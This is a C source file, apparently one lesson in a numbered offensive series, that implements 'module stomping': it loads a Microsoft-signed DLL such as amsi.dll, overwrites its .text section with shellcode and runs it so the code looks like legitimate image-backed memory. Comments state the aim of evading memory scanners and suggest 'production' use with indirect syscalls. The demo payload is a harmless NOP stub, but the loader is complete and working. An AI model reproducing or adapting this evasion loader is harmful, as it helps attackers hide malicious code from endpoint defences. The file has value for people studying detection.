/*
 * 13_module_stomping.c
 * =====================
 * Module Stomping - Shellcode in "legitimate" memory
 *
 * PROBLEM: when you allocate memory with VirtualAlloc and place
 * shellcode there, that memory shows as "private commit" -
 * memory that does NOT correspond to any file on disk.
 * Memory scanners (Moneta, PE-sieve) detect this easily:
 * "why is there executable code in memory that didn't come from a DLL?"
 *
 * SOLUTION: Module Stomping loads a LEGITIMATE DLL and overwrites
 * its .text section with our shellcode. The memory is now
 * "image commit" - backed by a real file on disk.
 * Scanners see a Microsoft-signed module. Perfect.
 *
 * Flow:
 *   1. Load a legitimate DLL into the process (e.g.: amsi.dll, dbghelp.dll)
 *   2. Find the .text section of that DLL
 *   3. Change .text permission to RW
 *   4. Overwrite with our shellcode
 *   5. Change permission to RX
 *   6. Execute - memory appears to belong to the legitimate DLL
 *
 * Compile: cl.exe /O2 13_module_stomping.c
 */

#include <windows.h>
#include <stdio.h>

/* ---------------------------------------------------------------
 * findTextSection - Parses PE headers to find .text
 *
 * Returns pointer to the beginning of the .text section and its size.
 * The .text section contains the executable code of the DLL.
 * That's where we'll overwrite with our shellcode.
 *
 * Parameters:
 *   hModule   -> base address of the loaded DLL
 *   textSize  -> pointer that receives the section size
 *
 * Returns: pointer to the beginning of .text, or NULL
 * --------------------------------------------------------------- */
LPVOID findTextSection(HMODULE hModule, DWORD* textSize) {

    BYTE* base = (BYTE*)hModule;

    /*
     * Navigate through the PE structure:
     * base + 0x00 = DOS Header
     * base + dosHeader->e_lfanew = NT Headers
     * NT Headers + sizeof(headers) = Section Headers (array)
     */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);

    /* Iterate through all sections looking for ".text" */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {

        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            *textSize = sections[i].Misc.VirtualSize;

            /*
             * base + VirtualAddress = actual address of the section in memory
             * VirtualAddress is the offset relative to the DLL base
             */
            return (LPVOID)(base + sections[i].VirtualAddress);
        }
    }

    return NULL;
}


int main() {

    printf("[*] Module Stomping\n");
    printf("[*] ================\n\n");

    /* ---------------------------------------------------------------
     * STEP 1: Load a DLL that is not critical to the system
     *
     * We choose a DLL that:
     *   - Is signed by Microsoft (looks trustworthy)
     *   - Is not essential (the system won't break if we alter it)
     *   - Has a .text section large enough for our shellcode
     *   - Is not commonly loaded (won't conflict with anything)
     *
     * Good options: amsi.dll, dbghelp.dll, wlanapi.dll,
     *               chakra.dll, msvcp140.dll
     *
     * LoadLibraryA loads the DLL into our process.
     * Windows maps it as "image commit" - memory backed
     * by a real file on disk.
     * --------------------------------------------------------------- */
    printf("[*] Loading sacrificial DLL...\n");

    HMODULE hDll = LoadLibraryA("amsi.dll");
    if (!hDll) {
        printf("[!] Failed to load amsi.dll. Trying dbghelp.dll...\n");
        hDll = LoadLibraryA("dbghelp.dll");
    }
    if (!hDll) {
        printf("[!] No DLL available\n");
        return 1;
    }

    printf("[+] DLL loaded at: 0x%p\n", hDll);

    /* ---------------------------------------------------------------
     * STEP 2: Find the .text section of the DLL
     * --------------------------------------------------------------- */
    DWORD textSize = 0;
    LPVOID textSection = findTextSection(hDll, &textSize);

    if (!textSection) {
        printf("[!] .text section not found\n");
        FreeLibrary(hDll);
        return 1;
    }

    printf("[+] .text section at: 0x%p (%lu bytes)\n", textSection, textSize);

    /* Demonstration shellcode */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90, /* NOP NOP NOP NOP */
        0xC3                     /* RET */
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    if (shellcodeSize > textSize) {
        printf("[!] Shellcode larger than .text section!\n");
        FreeLibrary(hDll);
        return 1;
    }

    /* ---------------------------------------------------------------
     * STEP 3: Change .text permission to RW (writable)
     *
     * .text is normally RX (can read and execute, NOT write).
     * We need write access to overwrite with our shellcode.
     * --------------------------------------------------------------- */
    DWORD oldPermission = 0;
    VirtualProtect(textSection, textSize, PAGE_READWRITE, &oldPermission);
    printf("[+] .text permission changed to RW\n");

    /* ---------------------------------------------------------------
     * STEP 4: Overwrite .text with shellcode (the "stomping")
     *
     * First we zero the entire section (optional, but cleans up
     * remnants of original code that could confuse scanners).
     * Then we copy the shellcode at the beginning.
     * --------------------------------------------------------------- */
    memset(textSection, 0, textSize);              /* clear everything */
    memcpy(textSection, shellcode, shellcodeSize);  /* copy shellcode */
    printf("[+] .text section overwritten with shellcode\n");

    /* ---------------------------------------------------------------
     * STEP 5: Restore permission to RX (executable)
     * --------------------------------------------------------------- */
    VirtualProtect(textSection, textSize, PAGE_EXECUTE_READ, &oldPermission);
    printf("[+] Permission restored to RX\n");

    /* ---------------------------------------------------------------
     * STEP 6: Execute
     *
     * The memory where the shellcode resides is now "image commit"
     * backed by amsi.dll (or dbghelp.dll). Memory scanners see:
     *
     *   Address: 0x7FFxxxxxx
     *   Type: IMAGE (not PRIVATE)
     *   Module: amsi.dll (Microsoft signed)
     *   Permission: RX (normal for code)
     *
     * No suspicious VirtualAlloc. No private commit with RX.
     * Looks completely normal.
     * --------------------------------------------------------------- */
    printf("\n[*] Executing shellcode...\n");
    printf("[*] Memory is IMAGE COMMIT (backed by signed DLL)\n");
    printf("[*] Memory scanners see a legitimate module\n\n");

    /* Create thread pointing to .text section (now with shellcode) */
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)textSection, NULL, 0, NULL);
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);

    printf("[+] Execution completed.\n");
    printf("[*] In production: combine with indirect syscall + callback\n");
    printf("    instead of CreateThread.\n");

    /* Do NOT FreeLibrary - the shellcode may still be running */
    return 0;
}
